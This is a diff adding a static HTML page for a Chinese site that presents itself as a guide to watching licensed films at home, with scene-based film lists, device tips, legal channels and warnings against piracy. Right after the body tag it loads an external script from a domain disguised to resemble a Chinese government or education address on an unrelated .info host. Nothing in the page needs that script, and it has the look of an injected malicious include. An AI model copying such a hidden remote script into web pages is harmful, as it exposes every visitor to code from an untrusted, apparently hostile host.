@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>宅片电影网 | 居家宅家观影指南与正版片单</title>
+  <meta name="description" content="宅片电影网做居家观影指南：沙发、卧室、宿舍、独居场景片单，画质设备小抄，正版渠道导航。不提供盗版播放与成人擦边内容。" />
+  <meta name="keywords" content="宅片电影网, 居家观影, 宅家片单, 沙发电影, 宿舍电影, 正版观影" />
+  <meta name="author" content="宅片电影网" />
+  <meta name="robots" content="index,follow" />
+  <meta name="theme-color" content="#f4b740" />
+  <link rel="canonical" href="https://zhaipiandianyingwang-h5.github.io/" />
+
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="宅片电影网" />
+  <meta property="og:title" content="宅片电影网 | 居家宅家观影指南" />
+  <meta property="og:description" content="不是宅男擦边站，是在家看片指南：场景片单+画质小抄+正版渠道。" />
+  <meta property="og:url" content="https://zhaipiandianyingwang-h5.github.io/" />
+  <meta property="og:locale" content="zh_CN" />
+
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="宅片电影网 | 居家宅家观影指南" />
+  <meta name="twitter:description" content="沙发/卧室/宿舍/独居场景片单，正版渠道，不碰盗版成人。" />
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebSite",
+    "name": "宅片电影网",
+    "url": "https://zhaipiandianyingwang-h5.github.io/",
+    "description": "居家宅家观影指南与正版片单推荐站。",
+    "inLanguage": "zh-CN"
+  }
+  </script>
+
+  <style>
+    :root{
+      --bg:#fff8ec;
+      --bg2:#fdeccb;
+      --card:#fffdf8;
+      --ink:#2c2418;
+      --muted:#8a755a;
+      --line:#f0d9a8;
+      --lamp:#f4b740;
+      --lamp-deep:#d99a1e;
+      --navy:#27374d;
+      --navy-soft:#3c4f6b;
+      --orange:#ef7d3a;
+      --orange-light:#ffe0c7;
+      --radius:18px;
+      --maxw:1180px;
+    }
+    *{box-sizing:border-box}
+    html{scroll-behavior:smooth}
+    body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--ink);line-height:1.75;-webkit-font-smoothing:antialiased}
+    a{color:inherit;text-decoration:none}
+    .wrap{max-width:var(--maxw);margin:0 auto;padding:0 20px}
+
+    header.nav{position:sticky;top:0;z-index:50;background:rgba(255,248,236,.96);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+    .nav-inner{display:flex;align-items:center;justify-content:space-between;height:62px}
+    .logo{font-weight:900;font-size:19px}
+    .logo b{color:var(--lamp-deep)}
+    .logo span{color:#a98c63}
+    nav.menu{display:flex;gap:14px;font-size:14px;color:var(--muted)}
+    nav.menu a{padding:7px 12px;border-radius:8px;transition:.2s}
+    nav.menu a:hover{color:var(--lamp-deep);background:var(--bg2)}
+    .nav-toggle{display:none;background:none;border:1px solid var(--line);color:var(--ink);border-radius:8px;padding:6px 10px;font-size:16px;cursor:pointer}
+
+    .hero{padding:72px 0 60px;border-bottom:1px solid var(--line);background:radial-gradient(800px 380px at 88% -10%,rgba(239,125,58,.18),transparent 60%),linear-gradient(135deg,var(--lamp),#ffce5e);position:relative;overflow:hidden}
+    .hero .lamp{position:absolute;left:-40px;bottom:-40px;width:240px;height:240px;border-radius:50%;background:rgba(39,55,77,.12)}
+    .hero .wrap{position:relative;z-index:1}
+    .hero .pill{display:inline-block;border:1px solid rgba(44,36,24,.25);color:#3a2f1c;border-radius:999px;padding:5px 16px;font-size:11px;font-weight:800;letter-spacing:3px;text-transform:uppercase;margin-bottom:18px;background:rgba(255,255,255,.4)}
+    .hero h1{font-size:clamp(28px,5vw,50px);line-height:1.14;margin:0 0 14px;font-weight:900;color:#2c2418}
+    .hero h1 em{font-style:normal;color:#fff}
+    .hero p.lead{font-size:16px;color:#4a3c25;max-width:600px;margin:0 0 22px}
+    .hero-tags{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px}
+    .hero-tag{border:1px solid rgba(44,36,24,.25);border-radius:6px;padding:5px 12px;font-size:12px;background:rgba(255,255,255,.45);color:#3a2f1c}
+    .cta{display:flex;gap:12px;flex-wrap:wrap}
+    .btn{padding:12px 24px;border-radius:10px;font-weight:800;font-size:14px;transition:.2s;display:inline-flex;gap:6px;align-items:center}
+    .btn-primary{background:var(--navy);color:#fff}
+    .btn-ghost{border:1px solid rgba(44,36,24,.35);color:#2c2418;background:rgba(255,255,255,.5)}
+
+    section{padding:58px 0;border-bottom:1px solid var(--line)}
+    .sec-head{margin-bottom:30px;text-align:center}
+    .sec-head .kicker{color:var(--lamp-deep);font-weight:800;letter-spacing:2px;text-transform:uppercase;font-size:11px}
+    .sec-head h2{font-size:clamp(22px,3.6vw,32px);margin:6px 0 8px;font-weight:900}
+    .sec-head p{color:var(--muted);margin:0 auto;max-width:620px;font-size:14px}
+
+    /* 场景 */
+    .scenes{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+    .scene{border:1px solid var(--line);border-radius:var(--radius);background:var(--card);padding:22px;transition:.25s;border-top:4px solid var(--lamp)}
+    .scene:nth-child(2){border-top-color:var(--navy-soft)}
+    .scene:nth-child(3){border-top-color:var(--orange)}
+    .scene:nth-child(4){border-top-color:#7bbf6a}
+    .scene:nth-child(5){border-top-color:#c98bd6}
+    .scene:nth-child(6){border-top-color:#5fb3c9}
+    .scene:hover{transform:translateY(-3px)}
+    .scene .emoji{font-size:34px}
+    .scene h3{margin:10px 0 6px;font-size:16px;font-weight:900}
+    .scene p{margin:0;color:var(--muted);font-size:13px}
+    .scene .chips{margin-top:10px;display:flex;flex-wrap:wrap;gap:6px}
+    .scene .chips span{font-size:11px;border:1px solid var(--line);border-radius:999px;padding:3px 9px;color:#7a6342;background:var(--bg)}
+
+    /* 片长筛选 */
+    .lengths{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+    .len{border:1px solid var(--line);border-radius:14px;background:var(--card);padding:18px;text-align:center}
+    .len b{display:block;font-size:20px;color:var(--lamp-deep)}
+    .len span{font-size:12px;color:var(--muted)}
+
+    /* 画质小抄 */
+    .tips{display:grid;grid-template-columns:1.2fr .8fr;gap:20px}
+    .tip-box{border:1px solid var(--line);border-radius:var(--radius);padding:24px;background:var(--card)}
+    .tip-box h3{margin-top:0;font-size:18px;color:var(--lamp-deep)}
+    .tip-box ul{padding-left:18px;color:var(--muted);font-size:14px}
+    .tip-box li{margin-bottom:8px}
+    .device{border:1px solid var(--line);border-radius:var(--radius);padding:20px;background:linear-gradient(180deg,var(--navy),var(--navy-soft));color:#f3ead6}
+    .device h3{margin-top:0;font-size:16px}
+    .device p{font-size:13px;opacity:.9}
+    .device .row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.15);font-size:13px}
+    .device .row:last-child{border-bottom:none}
+
+    /* 正版渠道 */
+    .channels{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+    .ch{border:1px solid var(--line);border-radius:14px;padding:20px;background:var(--card);text-align:center}
+    .ch .ic{font-size:28px}
+    .ch h3{margin:8px 0 4px;font-size:15px}
+    .ch p{margin:0;color:var(--muted);font-size:12px}
+
+    /* 避雷 */
+    .warn{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+    .w{border:1px solid var(--line);border-radius:var(--radius);padding:22px;background:var(--card);border-left:5px solid var(--orange)}
+    .w h3{margin:0 0 8px;font-size:16px}
+    .w p{margin:0;color:var(--muted);font-size:13px}
+
+    footer{padding:32px 0;text-align:center;color:#a98c63;font-size:13px;border-top:1px solid var(--line)}
+    footer a{color:var(--lamp-deep)}
+
+    #toTop{position:fixed;right:16px;bottom:16px;z-index:60;width:44px;height:44px;border-radius:50%;border:1px solid var(--line);background:var(--navy);color:#fff;font-size:18px;cursor:pointer;opacity:0;pointer-events:none;transition:.25s}
+    #toTop.show{opacity:1;pointer-events:auto}
+    .reveal{opacity:0;transform:translateY(16px);transition:.5s ease}
+    .reveal.in{opacity:1;transform:none}
+
+    @media (max-width:980px){
+      .scenes{grid-template-columns:1fr 1fr}
+      .lengths{grid-template-columns:repeat(2,1fr)}
+      .tips{grid-template-columns:1fr}
+      .channels{grid-template-columns:repeat(2,1fr)}
+      .warn{grid-template-columns:1fr}
+    }
+    @media (max-width:640px){
+      .nav-toggle{display:block}
+      nav.menu{position:absolute;top:62px;left:0;right:0;flex-direction:column;gap:0;padding:8px 20px 16px;background:rgba(255,248,236,.98);border-bottom:1px solid var(--line);display:none}
+      nav.menu.open{display:flex}
+      nav.menu a{padding:10px 8px;border-bottom:1px solid var(--line)}
+      .scenes{grid-template-columns:1fr}
+      .lengths{grid-template-columns:1fr 1fr}
+      .channels{grid-template-columns:1fr 1fr}
+    }
+  </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+  <header class="nav">
+    <div class="wrap nav-inner">
+      <div class="logo"><b>宅片</b><span>电影网</span></div>
+      <button class="nav-toggle" aria-label="菜单" onclick="document.getElementById('menu').classList.toggle('open')">☰</button>
+      <nav class="menu" id="menu">
+        <a href="#home">首页</a>
+        <a href="#scenes">宅家场景</a>
+        <a href="#length">片长筛选</a>
+        <a href="#tips">画质小抄</a>
+        <a href="#channels">正版渠道</a>
+        <a href="#warn">宅家避雷</a>
+      </nav>
+    </div>
+  </header>
+
+  <section class="hero" id="home">
+    <div class="lamp"></div>
+    <div class="wrap">
+      <div class="pill">Home Cinema · 不是擦边站</div>
+      <h1>宅片电影网<br/>把<em>家</em>变成小影院</h1>
+      <p class="lead">名字带“宅”，但只聊一件事：在家怎么舒服地看正版好片。沙发、床、宿舍、独居、带娃、合租——不同场景，不同片单。</p>
+      <div class="hero-tags">
+        <span class="hero-tag">沙发电影</span>
+        <span class="hero-tag">卧室微光</span>
+        <span class="hero-tag">宿舍合看</span>
+        <span class="hero-tag">独居深夜</span>
+        <span class="hero-tag">正版渠道</span>
+      </div>
+      <div class="cta">
+        <a class="btn btn-primary" href="#scenes">按场景挑片 →</a>
+        <a class="btn btn-ghost" href="#warn">避开盗版/擦边坑</a>
+      </div>
+    </div>
+  </section>
+
+  <section id="scenes" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Home Scenes</div>
+        <h2>宅家场景片单</h2>
+        <p>不是按“热门/最新”排，而是按你此刻人在哪、状态像什么排。</p>
+      </div>
+      <div class="scenes">
+        <div class="scene">
+          <div class="emoji">🛋️</div>
+          <h3>沙发瘫平</h3>
+          <p>周末下午，猫在旁边，不想动脑。要节奏顺、镜头美、中途去倒水也不慌。</p>
+          <div class="chips"><span>治愈</span><span>公路</span><span>群像</span><span>慢节奏</span></div>
+        </div>
+        <div class="scene">
+          <div class="emoji">🛏️</div>
+          <h3>卧室微光</h3>
+          <p>关大灯、开小夜灯。适合安静爱情、细腻文艺、雨声配独白那种片。</p>
+          <div class="chips"><span>爱情</span><span>文艺</span><span>日记感</span><span>低音量</span></div>
+        </div>
+        <div class="scene">
+          <div class="emoji">🎓</div>
+          <h3>宿舍合看</h3>
+          <p>四个人一台笔记本。要笑点密、不冷场、没人觉得尴尬。</p>
+          <div class="chips"><span>喜剧</span><span>悬疑爽片</span><span>动画</span><span>吐槽友好</span></div>
+        </div>
+        <div class="scene">
+          <div class="emoji">🌙</div>
+          <h3>独居深夜</h3>
+          <p>凌晨一点，城市静了。适合时间循环、孤独感、结尾让人发呆的片。</p>
+          <div class="chips"><span>科幻</span><span>存在主义</span><span>冷色调</span><span>后劲大</span></div>
+        </div>
+        <div class="scene">
+          <div class="emoji">🧸</div>
+          <h3>带娃家庭</h3>
+          <p>客厅全家出场。要能看、不吓人、大人也不至于睡着。</p>
+          <div class="chips"><span>合家欢</span><span>自然</span><span>音乐</span><span>无血腥</span></div>
+        </div>
+        <div class="scene">
+          <div class="emoji">🏠</div>
+          <h3>合租隔音差</h3>
+          <p>怕外放吵到邻居。戴耳机看、字幕清楚、对白多过爆炸的片最稳。</p>
+          <div class="chips"><span>台词戏</span><span>纪录片</span><span>访谈式</span><span>耳机友好</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="length" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">By Length</div>
+        <h2>按“还剩多少精力”筛</h2>
+        <p>不是所有晚上都扛得动 3 小时史诗。先看时长，再决定命运。</p>
+      </div>
+      <div class="lengths">
+        <div class="len"><b>＜40 min</b><span>短片 / 一集当电影看</span></div>
+        <div class="len"><b>90–110 min</b><span>标准片：最稳的晚上</span></div>
+        <div class="len"><b>120–150 min</b><span>周末大片：备好零食</span></div>
+        <div class="len"><b>＞150 min</b><span>导演剪辑/史诗：留整晚</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="tips" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Comfort Setup</div>
+        <h2>宅家画质与设备小抄</h2>
+        <p>片源正版只是第一步，看得舒服靠设置和耳朵。</p>
+      </div>
+      <div class="tips">
+        <div class="tip-box">
+          <h3>别再把笔记本放腿上看了</h3>
+          <ul>
+            <li>📺 投屏到电视：字幕别开“默认最小”，坐沙发上会瞎眼。</li>
+            <li>🔊 笔记本扬声器别硬扛：百元蓝牙音箱比自带喇叭强三倍。</li>
+            <li>💡 别全黑也别全亮：留一盏暖光小灯，眼睛不打架。</li>
+            <li>🎧 合租/深夜用耳机：选对白清晰的中性耳塞，别开重低音轰房东墙。</li>
+            <li>⏯️ 正版平台开“智能码率”：弱网别手动拉 4K，卡顿比模糊更毁情绪。</li>
+            <li>🌗 晚上开“暖色/蓝光过滤”，半夜看完不那么亢奋。</li>
+          </ul>
+        </div>
+        <div class="device">
+          <h3>宅家设备档位</h3>
+          <div class="row"><span>手机+耳机</span><span>通勤/深夜/合租</span></div>
+          <div class="row"><span>笔记本+小音箱</span><span>宿舍/单人房</span></div>
+          <div class="row"><span>电视投屏</span><span>沙发/家庭夜</span></div>
+          <div class="row"><span>投影+白墙</span><span>周末仪式感</span></div>
+          <div class="row"><span>平板床头架</span><span>卧室微光场</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="channels" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Legal Sources</div>
+        <h2>正版采摘渠道</h2>
+        <p>宅家不等于“随便搜个播放器”。下面这些才叫安心躺平。</p>
+      </div>
+      <div class="channels">
+        <div class="ch"><div class="ic">📺</div><h3>持权流媒体</h3><p>订阅制，字幕/画质/版权都稳</p></div>
+        <div class="ch"><div class="ic">🎟️</div><h3>单片租赁</h3><p>只看一部不办年卡</p></div>
+        <div class="ch"><div class="ic">🏛️</div><h3>公共文化</h3><p>老片/纪录片/艺术院线</p></div>
+        <div class="ch"><div class="ic">🎬</div><h3>院线重映</h3><p>修复版/导演剪辑/节日专场</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="warn" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Stay Safe</div>
+        <h2>宅家避雷三条</h2>
+        <p>“宅片”这词容易被垃圾站蹭，记住这三条就不会点错门。</p>
+      </div>
+      <div class="warn">
+        <div class="w">
+          <h3>🚫 盗版播放器</h3>
+          <p>“万能解码器”“免费高清播放器”强制下载、关杀软、跳博彩页——立刻关。正版平台不需要你装奇怪 exe。</p>
+        </div>
+        <div class="w">
+          <h3>🚫 成人擦边分类</h3>
+          <p>用“宅男专属/午夜福利/限制级合集/走光露点”当栏目名的，基本是违规擦边或引流，不进、不存、不分享。</p>
+        </div>
+        <div class="w">
+          <h3>🚫 网盘/磁力/解锁码</h3>
+          <p>“回复可见/加群发种子/网盘提取码”大多未授权。看片去持权平台，别把电脑变成木马窝。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="wrap">
+      © 2026 宅片电影网 ｜ 静态展示站点 ｜
+      内页链接以 <a href="#">#</a> 占位 ｜
+      本站仅作居家观影指南与正版渠道整理，不提供盗版资源、成人擦边内容与未授权播放。
+    </div>
+  </footer>
+
+  <button id="toTop" aria-label="回到顶部" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+  <script>
+    document.querySelectorAll('#menu a').forEach(function(a){
+      a.addEventListener('click',function(){ document.getElementById('menu').classList.remove('open'); });
+    });
+    var toTop=document.getElementById('toTop');
+    window.addEventListener('scroll',function(){ toTop.classList.toggle('show',window.scrollY>400); });
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){ if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target);} });
+    },{threshold:0.1});
+    document.querySelectorAll('.reveal').forEach(function(el){ io.observe(el); });
+  </script>
+</body>
+</html>
